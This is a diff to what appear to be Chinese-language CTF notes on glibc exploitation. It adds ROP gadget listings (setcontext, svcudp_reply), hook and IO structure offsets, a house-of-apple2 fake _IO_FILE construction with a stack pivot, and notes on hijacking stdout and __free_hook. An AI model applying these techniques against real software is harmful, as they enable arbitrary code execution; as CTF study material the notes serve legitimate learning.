@@ -42,7 +42,9 @@ tag:
   ROPgadget --binary ./libc.so.6 --only "mov|call" | grep "rdx" | grep "rax"
   ```
 
-### house of apple2
+### svcudp_reply
+
+> 可以让rdi的值赋值给rbp
 
 #### glibc2.38
 
@@ -56,6 +58,56 @@ tag:
  0x7f20cbd53381 <svcudp_reply+39>:    mov    esi,0x0
  0x7f20cbd53386 <svcudp_reply+44>:    mov    rdi,r13
  0x7f20cbd53389 <svcudp_reply+47>:    call   QWORD PTR [rax+0x28]
+```
+
+### setcontext
+
+> rdi指向的地址赋值给各个寄存器 通常是setcontext + 53 
+
+#### 通用
+
+```c
+setcontext_gadget = libc.sym["setcontext"] +libc_base + 53
+```
+
+### glibc2.27
+
+```c
+   0x00007f4af8b2a085 <+53>:    mov    rsp,QWORD PTR [rdi+0xa0]
+   0x00007f4af8b2a08c <+60>:    mov    rbx,QWORD PTR [rdi+0x80]
+   0x00007f4af8b2a093 <+67>:    mov    rbp,QWORD PTR [rdi+0x78]
+   0x00007f4af8b2a097 <+71>:    mov    r12,QWORD PTR [rdi+0x48]
+   0x00007f4af8b2a09b <+75>:    mov    r13,QWORD PTR [rdi+0x50]
+   0x00007f4af8b2a09f <+79>:    mov    r14,QWORD PTR [rdi+0x58]
+   0x00007f4af8b2a0a3 <+83>:    mov    r15,QWORD PTR [rdi+0x60]
+   0x00007f4af8b2a0a7 <+87>:    mov    rcx,QWORD PTR [rdi+0xa8]
+   0x00007f4af8b2a0ae <+94>:    push   rcx
+   0x00007f4af8b2a0af <+95>:    mov    rsi,QWORD PTR [rdi+0x70]
+   0x00007f4af8b2a0b3 <+99>:    mov    rdx,QWORD PTR [rdi+0x88]
+   0x00007f4af8b2a0ba <+106>:   mov    rcx,QWORD PTR [rdi+0x98]
+   0x00007f4af8b2a0c1 <+113>:   mov    r8,QWORD PTR [rdi+0x28]
+   0x00007f4af8b2a0c5 <+117>:   mov    r9,QWORD PTR [rdi+0x30]
+   0x00007f4af8b2a0c9 <+121>:   mov    rdi,QWORD PTR [rdi+0x68]
+   0x00007f4af8b2a0cd <+125>:   xor    eax,eax
+   0x00007f4af8b2a0cf <+127>:   ret
+
+```
+
+## hook
+
+```python
+malloc_hook  =  libc_base +libc.sym["__malloc_hook"]
+free_hook =  libc_base + libc.sym["__free_hook"]
+```
+
+## 获取IO结构体偏移
+
+```python
+_IO_list_all = libc.sym["_IO_list_all"] +libc_base
+_IO_2_1_stdin = libc.sym["_IO_2_1_stdin_"] +libc_base
+_IO_2_1_stdout = libc.sym["_IO_2_1_stdout_"] +libc_base
+_IO_2_1_stderr = libc.sym["_IO_2_1_stderr_"] +libc_base
+_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"] +libc_base
 ```
 
 ## 2.38
@@ -627,7 +679,250 @@ house of apple2的话我们要触发以下调用链 因为都是触发**overflow
 > - 其实就是edi+0x48位置赋值给rbp 
 
 ```python
+# fake wide
+fake_IO_addr = heap_base+0x290
+# 刚好让
+magic_gadget = 1250158 +libc_base
+leavn_retn =  0x477e7  +libc_base
+pop_rsp = 0x2879c  +libc_base
+print("pop_rsp:",hex(pop_rsp))
+# 执行ROP链的chunk地址
+ROP_addr = heap_base+0x100
+magic_addrs = {
+    # mov rbp,QWORD PTR [rdi+0x48]
+    "rbp": fake_IO_addr+0x40,
+    "rdi":fake_IO_addr +0x40,
+    "rax":fake_IO_addr +128,
+    "rbp_value" : ROP_addr,
+    "call":pop_rsp
+}
+wfile_addrs = {
+    # 指向地址+0x20 要为0
+    "_wide_data":fake_IO_addr-0x48,
+    # wide 虚表 要求0x68位置为执行函数
+    "_wide_vtable":fake_IO_addr,
+    # 首次执行函数地址 应该在结构体偏移0x68位置
+    "first_cmd":magic_gadget,
+}
+fsop_exit_addrs = {
+# 需要为0
+    "_mode":0,
+    # ptr大于base就行
+    "_IO_write_ptr":1,
+    "_IO_write_base":0,
+    # 随意一个可写地址就可以 会在上面写0
+    "_lock":fake_IO_addr,
+    "_IO_read_base":0,
+    # 要劫持vatble为多少
+    "vatble":_IO_wfile_jumps,
+}
+
+fake_IO = IO_FILE_plus_struct()
+fake_IO._IO_buf_end = magic_addrs.get("rbp_value")
+fake_IO._IO_save_base = magic_addrs.get("rbp")
+fake_IO._IO_backup_base = magic_addrs.get("rdi")
+fake_IO._IO_save_end = magic_addrs.get("rax")
+fake_IO._mode = fsop_exit_addrs.get("_mode")
+fake_IO._lock = fsop_exit_addrs.get("_lock")
+fake_IO.chain = wfile_addrs.get("first_cmd")
+fake_IO.fileno = 0
+fake_IO._old_offset = 0
+fake_IO._offset = 0
+fake_IO._wide_data = wfile_addrs.get("_wide_data")
+fake_IO.unknown2 = magic_addrs.get("call")
+fake_IO._codecvt= wfile_addrs.get("_wide_vtable")
+fake_IO.vtable = fsop_exit_addrs.get("vatble")
 ```
+
+#### 劫持puts` _IO_2_1_stdout`_
+
+- puts函数
+
+```c
+int
+_IO_puts (const char *str)
+{
+  int result = EOF;
+  _IO_size_t len = strlen (str);
+  _IO_acquire_lock (_IO_stdout);
+
+  if ((_IO_vtable_offset (_IO_stdout) != 0
+       || _IO_fwide (_IO_stdout, -1) == -1)
+      && _IO_sputn (_IO_stdout, str, len) == len
+      && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)
+    result = MIN (INT_MAX, len + 1);
+
+  _IO_release_lock (_IO_stdout);
+  return result;
+}
+```
+
+- 也就是保证lock指向的位置值为1
+- _mode应该为0
+- vtable应该为_IO_wfile_jumps-32,方便调用`_IO_wfile_overflow`
+
+## 2.27
+
+### _IO_FILE_plus结构体
+
+- _IO_FILE_plus
+
+```c
+/* offset    |  size */  type = struct _IO_FILE_plus {
+/*    0      |   216 */    _IO_FILE file;
+/*  216      |     8 */    const struct _IO_jump_t *vtable;
+
+                           /* total size (bytes):  224 */
+                         }
+
+```
+
+- _IO_FILE
+
+```c
+/* offset    |  size */  type = struct _IO_FILE {
+/*    0      |     4 */    int _flags;
+/* XXX  4-byte hole  */
+/*    8      |     8 */    char *_IO_read_ptr;
+/*   16      |     8 */    char *_IO_read_end;
+/*   24      |     8 */    char *_IO_read_base;
+/*   32      |     8 */    char *_IO_write_base;
+/*   40      |     8 */    char *_IO_write_ptr;
+/*   48      |     8 */    char *_IO_write_end;
+/*   56      |     8 */    char *_IO_buf_base;
+/*   64      |     8 */    char *_IO_buf_end;
+/*   72      |     8 */    char *_IO_save_base;
+/*   80      |     8 */    char *_IO_backup_base;
+/*   88      |     8 */    char *_IO_save_end;
+/*   96      |     8 */    struct _IO_marker *_markers;
+/*  104      |     8 */    struct _IO_FILE *_chain;
+/*  112      |     4 */    int _fileno;
+/*  116      |     4 */    int _flags2;
+/*  120      |     8 */    __off_t _old_offset;
+/*  128      |     2 */    unsigned short _cur_column;
+/*  130      |     1 */    signed char _vtable_offset;
+/*  131      |     1 */    char _shortbuf[1];
+/* XXX  4-byte hole  */
+/*  136      |     8 */    _IO_lock_t *_lock;
+/*  144      |     8 */    __off64_t _offset;
+/*  152      |     8 */    struct _IO_codecvt *_codecvt;
+/*  160      |     8 */    struct _IO_wide_data *_wide_data;
+/*  168      |     8 */    struct _IO_FILE *_freeres_list;
+/*  176      |     8 */    void *_freeres_buf;
+/*  184      |     8 */    size_t __pad5;
+/*  192      |     4 */    int _mode;
+/*  196      |    20 */    char _unused2[20];
+
+                           /* total size (bytes):  216 */
+                         }
+
+```
+
+### _IO_wide_data结构体
+
+```c
+/* offset    |  size */  type = struct _IO_wide_data {
+/*    0      |     8 */    wchar_t *_IO_read_ptr;
+/*    8      |     8 */    wchar_t *_IO_read_end;
+/*   16      |     8 */    wchar_t *_IO_read_base;
+/*   24      |     8 */    wchar_t *_IO_write_base;
+/*   32      |     8 */    wchar_t *_IO_write_ptr;
+/*   40      |     8 */    wchar_t *_IO_write_end;
+/*   48      |     8 */    wchar_t *_IO_buf_base;
+/*   56      |     8 */    wchar_t *_IO_buf_end;
+/*   64      |     8 */    wchar_t *_IO_save_base;
+/*   72      |     8 */    wchar_t *_IO_backup_base;
+/*   80      |     8 */    wchar_t *_IO_save_end;
+/*   88      |     8 */    __mbstate_t _IO_state;
+/*   96      |     8 */    __mbstate_t _IO_last_state;
+/*  104      |   192 */    struct _IO_codecvt {
+/*  104      |     8 */        void (*__codecvt_destr)(struct _IO_codecvt *);
+/*  112      |     8 */        enum __codecvt_result (*__codecvt_do_out)(struct _IO_codecvt *, __mbstate_t *, const wchar_t *, const wchar_t *, const wchar_t **, char *, char *, char **);
+/*  120      |     8 */        enum __codecvt_result (*__codecvt_do_unshift)(struct _IO_codecvt *, __mbstate_t *, char *, char *, char **);
+/*  128      |     8 */        enum __codecvt_result (*__codecvt_do_in)(struct _IO_codecvt *, __mbstate_t *, const char *, const char *, const char **, wchar_t *, wchar_t *, wchar_t **);
+/*  136      |     8 */        int (*__codecvt_do_encoding)(struct _IO_codecvt *);
+/*  144      |     8 */        int (*__codecvt_do_always_noconv)(struct _IO_codecvt *);
+/*  152      |     8 */        int (*__codecvt_do_length)(struct _IO_codecvt *, __mbstate_t *, const char *, const char *, size_t);
+/*  160      |     8 */        int (*__codecvt_do_max_length)(struct _IO_codecvt *);
+/*  168      |    64 */        _G_iconv_t __cd_in;
+/*  232      |    64 */        _G_iconv_t __cd_out;
+
+                               /* total size (bytes):  192 */
+                           } _codecvt;
+/*  296      |     4 */    wchar_t _shortbuf[1];
+/* XXX  4-byte hole  */
+/*  304      |     8 */    const struct _IO_jump_t *_wide_vtable;
+
+                           /* total size (bytes):  312 */
+                         }
+
+```
+
+### 虚表
+
+```c
+/* offset    |  size */  type = struct _IO_jump_t {
+/*    0      |     8 */    size_t __dummy;
+/*    8      |     8 */    size_t __dummy2;
+/*   16      |     8 */    _IO_finish_t __finish;
+/*   24      |     8 */    _IO_overflow_t __overflow;
+/*   32      |     8 */    _IO_underflow_t __underflow;
+/*   40      |     8 */    _IO_underflow_t __uflow;
+/*   48      |     8 */    _IO_pbackfail_t __pbackfail;
+/*   56      |     8 */    _IO_xsputn_t __xsputn;
+/*   64      |     8 */    _IO_xsgetn_t __xsgetn;
+/*   72      |     8 */    _IO_seekoff_t __seekoff;
+/*   80      |     8 */    _IO_seekpos_t __seekpos;
+/*   88      |     8 */    _IO_setbuf_t __setbuf;
+/*   96      |     8 */    _IO_sync_t __sync;
+/*  104      |     8 */    _IO_doallocate_t __doallocate;
+/*  112      |     8 */    _IO_read_t __read;
+/*  120      |     8 */    _IO_write_t __write;
+/*  128      |     8 */    _IO_seek_t __seek;
+/*  136      |     8 */    _IO_close_t __close;
+/*  144      |     8 */    _IO_stat_t __stat;
+/*  152      |     8 */    _IO_showmanyc_t __showmanyc;
+/*  160      |     8 */    _IO_imbue_t __imbue;
+
+                           /* total size (bytes):  168 */
+                         }
+
+```
+
+### 虚表实现
+
+> 2.27的实现都是分散的不是集中在一起的就参考_IO_jump_t吧
+
+### 劫持puts _IO_2_stdout_
+
+> 因为2.27具备hook 所以其实打io并不是一个很好的选择
+
+```c
+int
+_IO_puts (const char *str)
+{
+  int result = EOF;
+  _IO_size_t len = strlen (str);
+  _IO_acquire_lock (_IO_stdout);
+
+  if ((_IO_vtable_offset (_IO_stdout) != 0
+       || _IO_fwide (_IO_stdout, -1) == -1)
+      && _IO_sputn (_IO_stdout, str, len) == len
+      && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)
+    result = MIN (INT_MAX, len + 1);
+
+  _IO_release_lock (_IO_stdout);
+  return result;
+}
+```
+
+- 也就是保证lock指向的位置值为1
+- _mode应该为0
+- vtable应该为_IO_wfile_jumps-32,方便调用`_IO_wfile_overflow`
+
+## free_hook
+
+直接打free_hook就行 rdi就是我们的free的参数 这样我们就可以利用setcontext进行控制
 
 
 
